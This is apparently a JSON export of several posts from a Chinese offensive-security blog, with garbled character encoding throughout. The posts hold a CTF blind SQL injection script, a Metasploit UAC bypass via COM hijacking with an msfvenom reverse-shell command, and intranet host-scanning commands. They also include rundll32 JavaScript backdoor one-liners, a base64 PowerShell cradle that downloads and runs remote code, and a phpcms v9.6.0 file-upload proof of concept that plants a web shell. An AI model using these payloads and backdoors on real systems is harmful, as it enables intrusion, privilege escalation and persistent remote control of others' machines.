\"'\\u006fr\\u0020su\\u0062str((select\\u0020binary\\u0020table_name\\u0020from\\u0020inf\\u006frmation_schema.tables\\u0020where\\u0020TABLE_SCHEMA\\u003ddatabase()\\u0020limit\\u00200,1),&#123;0&#125;,1)\\u003d'&#123;1&#125;'\\u0020and\\u0020sl\\u0065ep(6)\\u0023\".format(x,i) #F1444g poc3 = \"'\\u006fr\\u0020su\\u0062str((select\\u0020binary\\u0020column_name\\u0020from\\u0020inf\\u006frmation_schema.columns\\u0020where\\u0020TABLE_SCHEMA\\u003ddatabase()\\u0020limit\\u00200,1),&#123;0&#125;,1)\\u003d'&#123;1&#125;'\\u0020and\\u0020sl\\u0065ep(6)\\u0023\".format(x,i) #F1a9 poc4 = \"'\\u006fr\\u0020su\\u0062str((select\\u0020binary\\u0020F1a9\\u0020from\\u0020F1444g\\u0020limit\\u00200,1),&#123;0&#125;,1)\\u003d'&#123;1&#125;'\\u0020and\\u0020sl\\u0065ep(6)\\u0023\".format(x,i) headers = &#123;\"Cookie\":'islogin=1; login_data=&#123;\\\"admin_user\\\":\\\"'+poc4+'\\\"&#125;'&#125; r = requests.get(url,headers=headers) if time.time() - startTime &gt; 5: flag += i print flag break","categories":[{"name":"Write-up","slug":"Write-up","permalink":"http://patrilic.top/categories/Write-up/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://patrilic.top/tags/CTF/"}]},{"title":"bypassUAC_via_comhijacking","slug":"bypassUAC_via_comhijacking","date":"2019-04-03T05:12:49.000Z","updated":"2019-08-30T01:07:18.526Z","comments":true,"path":"2019/04/03/bypassUAC_via_comhijacking/","link":"","permalink":"http://patrilic.top/2019/04/03/bypassUAC_via_comhijacking/","excerpt":"","text":"@Author: Patrilic@Time: 2019-02-03 13:12:49 0x01 ComåŠ«æŒåŸç†åˆ©ç”¨CLSIDæœç´¢é¡ºåºï¼š HKCU\\Software\\Classes\\CLSID HKCR\\CLSID HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\ShellCompatibility\\Objects\\ å°†è¢«åŠ«æŒçš„CLSIDå­˜å…¥ï¼šHKCU\\Software\\Classes\\CLSID CLSID ç»“æ„1234HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\CLSID &#123;CLSID&#125; InprocServer32 (Default) = path ThreadingModel = value 0x02 uacbypass_comhijackåˆ†æåˆ¤æ–­ç³»ç»Ÿç‰ˆæœ¬ 1234567def check if sysinfo['OS'] =~ /Windows (7|8|10|2008|2012|2016)/ &amp;&amp; is_uac_enabled? # ä»meterpreterä¸­åˆ¤æ–­OSç‰ˆæœ¬ Exploit::CheckCode::Appears else Exploit::CheckCode::Safe end end åŠ«æŒç‚¹ï¼ševentvwr.exe å’Œ mmc.exe12345678910111213@@hijack_points = [ &#123; name: 'Event Viewer', cmd_path: '%WINDIR%\\System32\\eventvwr.exe', class_ids: ['0A29FF9E-7F9C-4437-8B11-F424491E3931'] &#125;, &#123; name: 'Computer Managment', cmd_path: '%WINDIR%\\System32\\mmc.exe', cmd_args: 'CompMgmt.msc', class_ids: ['0A29FF9E-7F9C-4437-8B11-F424491E3931'] &#125; ] 123456789101112131415161718192021222324def hijack_com(registry_view, dll_path) target = @@hijack_points.sample target_clsid = target[:class_ids].sample root_key = \"#&#123;CLSID_PATH&#125;\\\\&#123;#&#123;target_clsid&#125;&#125;\" inproc_key = \"#&#123;root_key&#125;\\\\InProcServer32\" shell_key = \"#&#123;root_key&#125;\\\\ShellFolder\" registry_createkey(root_key, registry_view) registry_createkey(inproc_key, registry_view) registry_createkey(shell_key, registry_view) registry_setvaldata(inproc_key, DEFAULT_VAL_NAME, dll_path, 'REG_SZ', registry_view) registry_setvaldata(inproc_key, 'ThreadingModel', 'Apartment', 'REG_SZ', registry_view) registry_setvaldata(inproc_key, 'LoadWithoutCOM', '', 'REG_SZ', registry_view) registry_setvaldata(shell_key, 'HideOnDesktop', '', 'REG_SZ', registry_view) registry_setvaldata(shell_key, 'Attributes', 0xf090013d, 'REG_DWORD', registry_view) &#123; name: target[:name], cmd_path: target[:cmd_path], cmd_args: target[:cmd_args], root_key: root_key &#125; end å‘æ³¨å†Œè¡¨æ·»åŠ  HKCU\\Software\\Classes\\CLSID{0A29FF9E-7F9C-4437-8B11-F424491E3931}\\InProcServer32HKCU\\Software\\Classes\\CLSID{0A29FF9E-7F9C-4437-8B11-F424491E3931}\\ShellFolder InProcServer ä¸­ï¼š Default -&gt; dll_path ThreadingModel -&gt; Apartment LoadWithoutCOM -&gt; Null ShellFolder ä¸­ï¼š HideOnDesktop -&gt; Null Attributes -&gt; 0xf090013d 0x03 å¤ç°1msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=10.131.36.131 lport=4444 -f exe &gt; out.exe å›å¼¹æ‹¿åˆ°meterpreter session æ— æ³•getsystem å¯ä»¥çœ‹åˆ°ï¼ŒåŠ«æŒäº†CLSID {0A29FF9E-7F9C-4437-8B11-F424491E3931}çš„ä¼šè¯ï¼ŒæˆåŠŸæ‹¿åˆ°åå¼¹session","categories":[{"name":"BypassUac","slug":"BypassUac","permalink":"http://patrilic.top/categories/BypassUac/"}],"tags":[{"name":"å†…ç½‘æ¸—é€","slug":"å†…ç½‘æ¸—é€","permalink":"http://patrilic.top/tags/å†…ç½‘æ¸—é€/"}]},{"title":"å†…ç½‘ä¸»æœºå‘ç°","slug":"å†…ç½‘ä¸»æœºå‘ç°","date":"2019-04-03T03:59:32.000Z","updated":"2019-08-20T15:30:46.173Z","comments":true,"path":"2019/04/03/å†…ç½‘ä¸»æœºå‘ç°/","link":"","permalink":"http://patrilic.top/2019/04/03/å†…ç½‘ä¸»æœºå‘ç°/","excerpt":"","text":"@Author: Patrilic@Time: 2019-02-03 11:59:32 0x01 å‘ç°å†…ç½‘å­˜æ´»ä¸»æœº1.1 åŸºäºARPå‘ç°å†…ç½‘ä¸»æœºnmap1nmap -sn -PR 10.253.6.0/24 powershell1C:\\Users\\Patrilic\\Desktop&gt;powershell -exec bypass -Command &quot;Import-Module ./Invoke-ARPScan.ps1;Invoke-ARPScan -CIDR 192.168.121.1/24&quot; Invoke-ARPScan æ˜¯Empireä¸­çš„æ¨¡å— arp-scan.exe1C:\\Users\\Patrilic\\Desktop&gt;arp-scan.exe -t 192.168.121.0/24 arp-ping.exe1C:\\Users\\Patrilic\\Desktop&gt;arp-ping.exe 192.168.121.1 Empirenetdiscover1netdiscover -r 192.168.3.0/24 -i eth0 meterpreter12meterpreter &gt; getsystemmeterpreter &gt; run post/windows/gather/arp_scanner RHOSTS=10.253.6.1/24 Cainç­‰1.2 åŸºäºicmpå‘ç°ä¸»æœºcmd1C:\\Users\\Patrilic\\Desktop&gt;for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.121.%I | findstr \"TTL=\" nmap1nmap -sn -PE 192.168.3.0/24 powershell1powershell.exe -exec bypass -Command \"Import-Module C:\\Invoke-TSPingSweep.ps1;Invoke-TSPingSweep -StartAddress 192.168.3.1 -EndAddress 192.168.3.254 -ResolveHost -ScanPort -Port 21,22,23,25,53,80,81,82,83,84,85,86,87,88,89,110,111,143,389,443,445,873,1025,1433,1521,2601,3306,3389,3690,5432,5900,7001,8000,8080,8081,8082,8083,8084,8085,8086,8087,8089,9090,10000\" bash1234567for ip in 10.131.36.&#123;1..254&#125; do ping $ip -c 1 &amp;&gt; /dev/null if [ $? -eq 0 ];then echo $ip is alive .... fi done 1.3 åŸºäºnetbiosåè®®å‘ç°ä¸»æœºcmd1nbtstat -n nbtscan1nbtscan-1.0.35.exe -m 192.168.121.0/24 nmap1nmap -sU --script nbstat.nse -p137 192.168.1.0/24 -T4 1.4 åŸºäºsmbåè®®å‘ç°ä¸»æœºnmap1nmap â€sU â€sS â€â€script smbâ€enumâ€shares.nse â€p445 192.168.1.119/24 cmd1for /l %a in(1,1,254) do start /min /low telnet 192.168.1.%a 445 powershell12445|%&#123;echo((newâ€objectNet.Sockets.TcpClient).Connect(\"10.253.6\",$_)) \"$_ is open\"&#125; 2&gt;$null 11..5|%&#123;$a=$_;445|%&#123;echo((newâ€object Net.Sockets.TcpClient).Connect(\"192.168.1.$a\",$_)) \"Port $_ is open\"&#125; 2&gt;$null&#125; 1118..119|%&#123;$a=$_;writeâ€host\"â€â€â€â€â€â€\";writeâ€host \"192.168.1.$a\"; 80,445 | % &#123;echo ((newâ€object Net.Sockets.TcpClient).Con ect(\"192.168.1.$a\",$_)) \"Port $_ is open\"&#125; 2&gt;$null&#125; 1.5 åŸºäºsnmpå‘ç°ä¸»æœºnmap1nmap -sU --script snmp-brute 192.168.1.0/24 -T4 perlhttps://github.com/dheiland-r7/snmp 1.6 åŸºäºudpå‘ç°ä¸»æœºnmap1nmap -sU -T5 -sV --max-retries 1 192.168.1.100 -p 500 unicornscan1unicornscan -mU 192.168.1.100 1.7 åŸºäºSqlDataSourceEnumerator1PowerShell -Command \"[System.Data.Sql.SqlDataSourceEnumerator]::Instance.GetDataSources()\" 1.8 åŸºäºmsfå‘ç°ä¸»æœºhttpæœåŠ¡1auxiliary/scanner/http/http_version 1auxiliary/scanner/http/title smbæœåŠ¡1auxiliary/scanner/smb/smb_version ftpæœåŠ¡1auxiliary/scanner/ftp/ftp_version 1auxiliary/scanner/ftp/anonymous arpæœåŠ¡1auxiliary/scanner/discovery/arp_sweep udpæœåŠ¡1auxiliary/scanner/discovery/udp_sweep 1auxiliary/scanner/discovery/udp_probe sshæœåŠ¡1auxiliary/scanner/ssh/ssh_version telnetæœåŠ¡1auxiliary/scanner/telnet/telnet_version dnsæœåŠ¡1auxiliary/scanner/dns/dns_amp mysqlæœåŠ¡1auxiliary/scanner/mysql/mysql_version netbiosæœåŠ¡1auxiliary/scanner/netbios/nbname db2æœåŠ¡1auxiliary/scanner/db2/db2_version ç«¯å£å‘ç°1auxiliary/scanner/portscan/ack 1auxiliary/scanner/portscan/tcp 1auxiliary/scanner/portscan/syn 1auxiliary/scanner/portscan/syn 1auxiliary/scanner/portscan/ftpbounce 1auxiliary/scanner/portscan/xmas rdpæœåŠ¡1auxiliary/scanner/rdp/rdp_scanner smtpæœåŠ¡1auxiliary/scanner/smtp/smtp_version pop3æœåŠ¡1auxiliary/scanner/pop3/pop3_version posgresæœåŠ¡1auxiliary/scanner/postgres/postgres_version è°ƒç”¨nmap1db_nmap postç»„ä»¶1234567891011windows/gather/arp_scanner windows/gather/enum_ad_computers windows/gather/enum_computers windows/gather/enum_domain windows/gather/enum_domains windows/gather/enum_ad_user_commentslinux/gather/enum_network linux/busybox/enum_hosts windows/gather/enum_ad_users windows/gather/enum_domain_tokens windows/gather/enum_snmp","categories":[{"name":"Red-Team Tricks","slug":"Red-Team-Tricks","permalink":"http://patrilic.top/categories/Red-Team-Tricks/"}],"tags":[{"name":"å†…ç½‘æ¸—é€","slug":"å†…ç½‘æ¸—é€","permalink":"http://patrilic.top/tags/å†…ç½‘æ¸—é€/"}]},{"title":"JS+CHMæ†ç»‘åé—¨","slug":"JS + CHM æ†ç»‘åé—¨","date":"2019-04-03T03:58:32.000Z","updated":"2019-08-20T15:28:32.631Z","comments":true,"path":"2019/04/03/JS + CHM æ†ç»‘åé—¨/","link":"","permalink":"http://patrilic.top/2019/04/03/JS + CHM æ†ç»‘åé—¨/","excerpt":"","text":"@Author: Patrilic@Time: 2019-02-03 11:58:32å­¦äº†ä¸€æ³¢evi1cgåšå®¢ä¸Šçš„æ†ç»‘åé—¨ï¼Œåšä¸ªè®°å½• 0x01 æ€è·¯ æ€è·¯ï¼šåˆ©ç”¨CHMåé—¨è°ƒç”¨rundll32.exeæ‰§è¡Œjavascriptè·å–æ¶æ„ä»£ç å¹¶æ‰§è¡Œ ç»“æœï¼šäº¤äº’å¼shell or meterpreterï¼ˆpoershellï¼‰ 0x02 chmåé—¨calc.exe P0c123456789101112&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Mousejack replay&lt;/title&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;command exec &lt;OBJECT id=x classid=&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot; width=1 height=1&gt;&lt;PARAM name=&quot;Command&quot; value=&quot;ShortCut&quot;&gt; &lt;PARAM name=&quot;Button&quot; value=&quot;Bitmap::shortcut&quot;&gt; &lt;PARAM name=&quot;Item1&quot; value=&apos;,calc.exe&apos;&gt; &lt;PARAM name=&quot;Item2&quot; value=&quot;273,1,1&quot;&gt;&lt;/OBJECT&gt;&lt;SCRIPT&gt;x.Click();&lt;/SCRIPT&gt;&lt;/body&gt;&lt;/html&gt; åˆ©ç”¨EasyCHMç¼–è¯‘htmlæ–‡ä»¶ è¿è¡Œï¼š 0x03 JSåé—¨æ ¸å¿ƒæ€è·¯ï¼šrundll32.exe æ‰§è¡Œ javascript è„šæœ¬ è®¿é—®C&amp;Cæ‰§è¡Œæ¶æ„ä»£ç  Pocï¼š12rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";alert('foo'); 0x04 CHM + JS æ†ç»‘æ€è·¯ï¼šCHMåé—¨ â€”-&gt; è°ƒç”¨rundll32.exe â€”â€“&gt; è°ƒç”¨javascript. â€”â€“&gt; è®¿é—®ç›®æ ‡C2æœåŠ¡å™¨ â€”â€”&gt;æ‰§è¡Œæ¶æ„ä»£ç  â€”â€“&gt; äº¤äº’å¼shell ä¼˜ç‚¹ï¼šé˜²æ­¢ä¼ ç»ŸCHMåé—¨ä½¿ç”¨CMD /c æ—¶å¼•èµ·çš„å¼¹çª— ç¼ºç‚¹ï¼š ç›´æ¥è·å–Meterpreter Session ä½¿ç”¨Exploit ï¼š exploit/multi/script/web_delivery å­˜åœ¨ç‰¹æ®Šå­—ç¬¦ï¼Œåœ¨cmdä¸‹æ˜¯ä¸èƒ½ç›´æ¥è¿è¡Œçš„,ä½¿ç”¨Base64ç¼–ç ï¼š Powershell :1powershell -ep bypass -enc PQBuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAA7AC4AcAByAG8AeAB5AD0AWwBOAGUAdAAuAFcAZQBiAFIAZQBxAHUAZQBzAHQAXQA6ADoARwBlAHQAUwB5AHMAdABlAG0AVwBlAGIAUAByAG8AeAB5ACgAKQA7AC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsASQBFAFgAIAAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAuADEAMAAzADoAOAAwADgAMQAvADEALwAnACkAOwAKAA== But: å¹¶ä¸èƒ½bypass 360ä¸»é˜²å…è®¸ç¨‹åºæ‰§è¡Œåï¼Œå¯å¾—åˆ°JSRAT Session ä»¥åŠ meterpreter Session ä¸»è¦è¿˜æ˜¯æ£€æµ‹äº†rundll32.exe è¿™ä¸ªæ•æ„Ÿè¿›ç¨‹ 0x05 æ€»ç»“JSåé—¨ä¼˜ç‚¹ï¼š æ— æ–‡ä»¶è½åœ° æŒç»­æ§åˆ¶ åå°rundll32.exeè¿›ç¨‹ç¨³å®š ç¼ºç‚¹ï¼šä¸å…æ€ï¼Œå®¹æ˜“è¢«æ£€æµ‹ CHMåé—¨ä¼˜ç‚¹ï¼šé’“é±¼å¼ºä¸ä¼šè¢«AVæ£€æµ‹ï¼Œåªä¼šåœ¨è°ƒç”¨å±é™©è¿›ç¨‹æ—¶è¢«æ£€æµ‹ï¼Œæœ¬èº«ä¸å«æœ‰æ¶æ„ä»£ç  é…åˆå¯ä»¥è¾¾åˆ°nishangä¸­ä¸å¼¹çª—çš„æ•ˆæœ 0x06 JS backdoor Tips//Execute A Command1rundll32.exe javascript:&quot;\\..\\mshtml,RunHTMLApplication &quot;;document.write();new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;calc&quot;); //Write To A File1rundll32.exe javascript:&quot;\\..\\mshtml,RunHTMLApplication &quot;;fso=new%20ActiveXObject(&quot;Scripting.FileSystemObject&quot;);a=fso.CreateTextFile(&quot;c:\\\\Temp\\\\testfile.txt&quot;,true);a.WriteLine(&quot;Test&quot;);a.Close();self.close; //Read and Execute From A File1rundll32.exe javascript:&quot;\\..\\mshtml,RunHTMLApplication &quot;;document.write();fso=new%20ActiveXObject(&quot;Scripting.FileSystemObject&quot;);f=fso.OpenTextFile(&quot;c:\\\\Temp\\\\testfile.txt&quot;,1);eval((f.ReadAll())); //Map A Remote Share (WEBDAV)1rundll32.exe javascript:&quot;\\..\\mshtml,RunHTMLApplication &quot;;n=new%20ActiveXObject(&apos;WScript.Network&apos;);n.MapNetworkDrive(&quot;S:&quot;,&quot;https://live.sysinternals.com&quot;);self.close; //Map A Local Share1rundll32.exe javascript:&quot;\\..\\mshtml,RunHTMLApplication &quot;;n=new%20ActiveXObject(&apos;WScript.Network&apos;);n.MapNetworkDrive(&quot;S:&quot;,&quot;\\\\\\\\Localhost\\\\c$&quot;);self.close; //Read and Execute Commands From A File1rundll32.exe javascript:&quot;\\..\\mshtml,RunHTMLApplication &quot;;document.write();fso=new%20ActiveXObject(&quot;Scripting.FileSystemObject&quot;);f=fso.OpenTextFile(&quot;c:\\\\Temp\\\\Commands.txt&quot;,1);while(!f.AtEndOfStream)&#123;t=new%20ActiveXObject(&quot;WScript.Shell&quot;);t.Run(&quot;cmd%20/c%20&quot;%20+%20f.ReadLine(),null,true);&#125;; //Retrieve Commands From HTTP1rundll32.exe javascript:&quot;\\..\\mshtml,RunHTMLApplication &quot;;document.write();h=new%20ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);h.Open(&quot;GET&quot;,&quot;http://127.0.0.1/a.txt&quot;,false);h.Send();B=h.ResponseText;alert(B); //POST results back to Server1rundll32.exe javascript:&quot;\\..\\mshtml,RunHTMLApplication &quot;;document.write();h=new%20ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);h.Open(&quot;POST&quot;,&quot;http://127.0.0.1:8081/a.php&quot;,false);h.Send(&quot;Stuff&quot;); 0x07 Linkshttps://evi1cg.me/archives/chm_backdoor.htmlhttp://drops.wooyun.org/tips/8568https://github.com/Ridter/MyJSRathttp://drops.wooyun.org/tips/11764http://drops.wooyun.org/tips/12386","categories":[],"tags":[{"name":"Backdoor","slug":"Backdoor","permalink":"http://patrilic.top/tags/Backdoor/"}]},{"title":"phpcms_v9.6.0 ä»»æ„æ–‡ä»¶ä¸Šä¼ ","slug":"phpcms_v9.6.0 ä»»æ„æ–‡ä»¶ä¸Šä¼ ","date":"2019-04-03T02:58:32.000Z","updated":"2019-08-20T15:29:32.111Z","comments":true,"path":"2019/04/03/phpcms_v9.6.0 ä»»æ„æ–‡ä»¶ä¸Šä¼ /","link":"","permalink":"http://patrilic.top/2019/04/03/phpcms_v9.6.0 ä»»æ„æ–‡ä»¶ä¸Šä¼ /","excerpt":"","text":"0x01 æ¼æ´åˆ†ææ¼æ´ urlï¼š http://localhost/index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1 è·Ÿè¿› /Applications/MxSrvs/www/phpcms_V9.6.0/install_package/phpcms/modules/member/index.php æ¼æ´ä»£ç ä»129è¡Œ-136è¡Œ1234567if($member_setting['choosemodel']) &#123; require_once CACHE_MODEL_PATH.'member_input.class.php'; require_once CACHE_MODEL_PATH.'member_update.class.php'; $member_input = new member_input($userinfo['modelid']); $_POST['info'] = array_map('new_html_special_chars',$_POST['info']); $user_model_info = $member_input-&gt;get($_POST['info']); &#125; $_POST[â€˜infoâ€™] è¢«å‡½æ•° new_html_special_chars è¿‡æ»¤ä¸€é1234567function new_html_special_chars($string) &#123; $encoding = 'utf-8'; if(strtolower(CHARSET)=='gbk') $encoding = 'ISO-8859-15'; if(!is_array($string)) return htmlspecialchars($string,ENT_QUOTES,$encoding); foreach($string as $key =&gt; $val) $string[$key] = new_html_special_chars($val); return $string;&#125; htmlspecialchars($string, ENT_QUOTES, $encoding)å®ä½“åŒ–ç¼–ç  å•å¼•å·å’ŒåŒå¼•å·1234567891011121314151617181920212223242526272829303132333435function get($data) &#123; $this-&gt;data = $data = trim_script($data); $model_cache = getcache('member_model', 'commons'); $this-&gt;db-&gt;table_name = $this-&gt;db_pre.$model_cache[$this-&gt;modelid]['tablename']; $info = array(); $debar_filed = array('catid','title','style','thumb','status','islink','description'); if(is_array($data)) &#123; foreach($data as $field=&gt;$value) &#123; if($data['islink']==1 &amp;&amp; !in_array($field,$debar_filed)) continue; $field = safe_replace($field); $name = $this-&gt;fields[$field]['name']; $minlength = $this-&gt;fields[$field]['minlength']; $maxlength = $this-&gt;fields[$field]['maxlength']; $pattern = $this-&gt;fields[$field]['pattern']; $errortips = $this-&gt;fields[$field]['errortips']; if(empty($errortips)) $errortips = \"$name ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Òªï¿½ï¿½\"; $length = empty($value) ? 0 : strlen($value); if($minlength &amp;&amp; $length &lt; $minlength &amp;&amp; !$isimport) showmessage(\"$name ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ $minlength ï¿½ï¿½ï¿½Ö·ï¿½ï¿½ï¿½\"); if (!array_key_exists($field, $this-&gt;fields)) showmessage('Ä£ï¿½ï¿½ï¿½Ğ²ï¿½ï¿½ï¿½ï¿½ï¿½'.$field.'ï¿½Ö¶ï¿½'); if($maxlength &amp;&amp; $length &gt; $maxlength &amp;&amp; !$isimport) &#123; showmessage(\"$name ï¿½ï¿½ï¿½Ã³ï¿½ï¿½ï¿½ $maxlength ï¿½ï¿½ï¿½Ö·ï¿½ï¿½ï¿½\"); &#125; else &#123; str_cut($value, $maxlength); &#125; if($pattern &amp;&amp; $length &amp;&amp; !preg_match($pattern, $value) &amp;&amp; !$isimport) showmessage($errortips); if($this-&gt;fields[$field]['isunique'] &amp;&amp; $this-&gt;db-&gt;get_one(array($field=&gt;$value),$field) &amp;&amp; ROUTE_A != 'edit') showmessage(\"$name ï¿½ï¿½Öµï¿½ï¿½ï¿½ï¿½ï¿½Ø¸ï¿½ï¿½ï¿½\"); $func = $this-&gt;fields[$field]['formtype']; if(method_exists($this, $func)) $value = $this-&gt;$func($field, $value); $info[$field] = $value; &#125; &#125; return $info; &#125; å‚æ•°ä¼ å…¥ï¼šé¦–å…ˆç»è¿‡ trim_script å‡½æ•°ï¼Œ è¿‡æ»¤æ‰scriptå’Œiframe1234567function trim_script($str) &#123; $str = preg_replace ( '/\\&lt;([\\/]?)script([^\\&gt;]*?)\\&gt;/si', '&amp;lt;\\\\1script\\\\2&amp;gt;', $str ); $str = preg_replace ( '/\\&lt;([\\/]?)iframe([^\\&gt;]*?)\\&gt;/si', '&amp;lt;\\\\1iframe\\\\2&amp;gt;', $str ); $str = preg_replace ( '/\\&lt;([\\/]?)frame([^\\&gt;]*?)\\&gt;/si', '&amp;lt;\\\\1frame\\\\2&amp;gt;', $str ); $str = preg_replace ( '/]]\\&gt;/si', ']] &gt;', $str ); return $str;&#125; å†ç»è¿‡safe_replace å‡½æ•°ï¼Œè¿‡æ»¤ç‰¹æ®Šå­—ç¬¦12345678910111213141516function safe_replace($string) &#123; $string = str_replace('%20','',$string); // ç©ºæ ¼ $string = str_replace('%27','',$string); // å•å¼•å· $string = str_replace('%2527','',$string); // åŒé‡ç¼–ç  $string = str_replace('*','',$string); $string = str_replace('\"','&amp;quot;',$string); $string = str_replace(\"'\",'',$string); $string = str_replace('\"','',$string); $string = str_replace(';','',$string); $string = str_replace('&lt;','&amp;lt;',$string); $string = str_replace('&gt;','&amp;gt;',$string); $string = str_replace(\"&#123;\",'',$string); $string = str_replace('&#125;','',$string); $string = str_replace('\\\\','',$string); return $string;&#125; 12$func = $this-&gt;fields[$field]['formtype']; if(method_exists($this, $func)) $value = $this-&gt;$func($field, $value); ediotr æ–¹æ³•1234567891011function editor($field, $value) &#123; $setting = string2array($this-&gt;fields[$field]['setting']); $enablesaveimage = $setting['enablesaveimage']; if(isset($_POST['spider_img'])) $enablesaveimage = 0; if($enablesaveimage) &#123; $site_setting = string2array($this-&gt;site_config['setting']); $watermark_enable = intval($site_setting['watermark_enable']); $value = $this-&gt;attachment-&gt;download('content', $value,$watermark_enable); &#125; return $value; &#125; $value = $this-&gt;attachment-&gt;download(â€˜contentâ€™, $value, $watermark_enable); ä¼ å…¥çš„è¢«å¸¦å…¥downloadå‡½æ•° 123456789101112131415161718192021222324252627282930313233343536373839404142434445function download($field, $value,$watermark = '0',$ext = 'gif|jpg|jpeg|bmp|png', $absurl = '', $basehref = '') &#123; global $image_d; $this-&gt;att_db = pc_base::load_model('attachment_model'); $upload_url = pc_base::load_config('system','upload_url'); $this-&gt;field = $field; $dir = date('Y/md/'); $uploadpath = $upload_url.$dir; $uploaddir = $this-&gt;upload_root.$dir; $string = new_stripslashes($value); if(!preg_match_all(\"/(href|src)=([\\\"|']?)([^ \\\"'&gt;]+\\.($ext))\\\\2/i\", $string, $matches)) return $value; $remotefileurls = array(); foreach($matches[3] as $matche) &#123; if(strpos($matche, '://') === false) continue; dir_create($uploaddir); $remotefileurls[$matche] = $this-&gt;fillurl($matche, $absurl, $basehref); &#125; unset($matches, $string); $remotefileurls = array_unique($remotefileurls); $oldpath = $newpath = array(); foreach($remotefileurls as $k=&gt;$file) &#123; if(strpos($file, '://') === false || strpos($file, $upload_url) !== false) continue; $filename = fileext($file); $file_name = basename($file); $filename = $this-&gt;getname($filename); $newfile = $uploaddir.$filename; $upload_func = $this-&gt;upload_func; if($upload_func($file, $newfile)) &#123; $oldpath[] = $k; $GLOBALS['downloadfiles'][] = $newpath[] = $uploadpath.$filename; @chmod($newfile, 0777); $fileext = fileext($filename); if($watermark)&#123; watermark($newfile, $newfile,$this-&gt;siteid); &#125; $filepath = $dir.$filename; $downloadedfile = array('filename'=&gt;$filename, 'filepath'=&gt;$filepath, 'filesize'=&gt;filesize($newfile), 'fileext'=&gt;$fileext); $aid = $this-&gt;add($downloadedfile); $this-&gt;downloadedfiles[$aid] = $filepath; &#125; &#125; return str_replace($oldpath, $newpath, $value); &#125; wafï¼š if(!preg_match_all(â€œ/(href|src)=([\\â€|â€™]?)([^ \\â€â€˜&gt;]+.($ext))\\2/iâ€, $string, $matches)) return $value; åç¼€ï¼š$ext = â€˜gif|jpg|jpeg|bmp|pngâ€™ä½¿ç”¨ php#.jpg ç»•è¿‡ è¿›å…¥åˆ° fillurl å‡½æ•°åœ¨ 301 è¡Œå»æ‰äº† # \\$pos = strpos($surl,â€™#â€™); $remotefileurls = http://url/shell.php 0x02 æ¼æ´å¤ç° 0x03 POC1234567891011121314151617181920212223# -*- coding: utf-8 -*-# @Time : 2018-12-20 22:57# @Author : Patrilic# @FileName: file_writein_poc.py# @Software: PyCharmimport requestsurl = 'http://localhost/phpcms_V9.6.0/install_package/index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1'data = &#123; 'siteid': '1', 'modelid': '1', 'username': 'test', 'password': 'testxx', 'email': 'test@test.com', 'info[content]': '&lt;img src=http://url/shell.txt?.php#.jpg&gt;', 'dosubmit': '1',&#125;poc = requests.post(url,data= data)print(poc)","categories":[{"name":"æ¼æ´å¤ç°","slug":"æ¼æ´å¤ç°","permalink":"http://patrilic.top/categories/æ¼æ´å¤ç°/"}],"tags":[{"name":"ä»£ç å®¡è®¡","slug":"ä»£ç å®¡è®¡","permalink":"http://patrilic.top/tags/ä»£ç å®¡è®¡/"}]},{"title":"phpcms_v9.6.0 wapæ¨¡å— SQLæ³¨å…¥","slug":"phpcms_v9.6.0 wapæ¨¡å— sqlæ³¨å…¥","date":"2019-04-03T02:58:32.000Z","updated":"2019-08-20T15:29:28.741Z","comments":true,"path":"2019/04/03/phpcms_v9.6.0 wapæ¨¡å— sqlæ³¨å…¥/","link":"","permalink":"http://patrilic.top/2019/04/03/phpcms_v9.6.0 wapæ¨¡å— sqlæ³¨å…¥/","excerpt":"","text":"0x01 æ¼æ´åˆ†ææ¼æ´å‘ç”Ÿåœ¨ /Applications/MxSrvs/www/phpcms_V9.6.0/install_package/phpcms/modules/content/down.php 12345678910111213141516public function init() &#123; $a_k = trim($_GET['a_k']); if(!isset($a_k)) showmessage(L('illegal_parameters')); $a_k = sys_auth($a_k, 'DECODE', pc_base::load_config('system','auth_key')); if(empty($a_k)) showmessage(L('illegal_parameters')); unset($i,$m,$f); parse_str($a_k); if(isset($i)) $i = $id = intval($i); if(!isset($m)) showmessage(L('illegal_parameters')); if(!isset($modelid)||!isset($catid)) showmessage(L('illegal_parameters')); if(empty($f)) showmessage(L('url_invalid')); $allow_visitor = 1; $MODEL = getcache('model','commons'); $tablename = $this-&gt;db-&gt;table_name = $this-&gt;db-&gt;db_tablepre.$MODEL[$modelid]['tablename']; $this-&gt;db-&gt;table_name = $tablename.'_data'; $rs = $this-&gt;db-&gt;get_one(array('id'=&gt;$id)); $_GET æ–¹æ³•ä¼ å…¥ $a_k ï¼Œ ç»è¿‡sys_auth è§£å¯†ä¹‹åï¼Œè¿›å…¥ parse_str,è§£æåˆ°å˜é‡ä¸­æœ€åå¸¦å…¥åˆ° \\$rs = \\$this-&gt;db-&gt;get_one(array(â€˜idâ€™=&gt;$id)); è¿›è¡ŒæŸ¥è¯¢ æ‰€ä»¥ç°åœ¨å¦‚æœèƒ½æ‰¾åˆ°ä¸€ä¸ªç»è¿‡sys_auth å¹¶èƒ½å›æ˜¾ç»™æˆ‘payloadçš„åœ°æ–¹å³å¯ 